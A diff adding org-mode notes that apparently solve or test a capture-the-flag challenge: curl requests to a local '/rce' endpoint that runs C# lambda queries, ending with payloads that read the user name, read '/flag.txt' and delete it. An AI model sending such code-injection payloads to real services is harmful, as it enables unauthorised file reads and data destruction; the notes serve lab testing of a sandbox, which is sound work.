@@ -1,0 +1,45 @@
+Test connectivity:
+#+begin_src sh
+curl --request GET --url http://localhost:8001/
+#+end_src
+
+ROT13:
+#+begin_src sh
+curl --request POST \
+      --url http://localhost:8001/rce \
+      --header 'Content-Type: application/json' \
+      --data '{
+  "Data": ["hello", "crypto", "lena", "LosFuzzys"],
+  "Query": "(data) => data.Select(d => !string.IsNullOrEmpty(d) ? new string (d.ToCharArray().Select(s =>  { return (char)(( s >= 97 && s <= 122 ) ? ( (s + 13 > 122 ) ? s - 13 : s + 13) : ( s >= 65 && s <= 90 ? (s + 13 > 90 ? s - 13 : s + 13) : s )); }).ToArray() ) : d)"
+  }'
+#+end_src
+
+Environment.User:
+#+begin_src sh
+curl --request POST \ --url http://localhost:8001/rce \
+      --header 'Content-Type: application/json' \
+      --data '{
+  "Data": ["placeholder"],
+  "Query": "(data) => data.Select(d => Environment.UserName)"
+  }'
+#+end_src
+
+System.IO solution:
+#+begin_src sh
+curl --request POST \ --url http://localhost:8001/rce \
+      --header 'Content-Type: application/json' \
+      --data '{
+  "Data": ["placeholder"],
+  "Query": "(data) => data.Select(d => System.IO.File.ReadAllText(\"/flag.txt\"))"
+  }'
+#+end_src
+
+Delete flag (we shouldn't be able to!):
+#+begin_src sh
+curl --request POST \ --url http://localhost:8001/rce \
+      --header 'Content-Type: application/json' \
+      --data '{
+  "Data": ["placeholder"],
+  "Query": "(data) => data.Select(d => {System.IO.File.Delete(\"/flag.txt\"); return \"ROFL\";})"
+  }'
+#+end_src
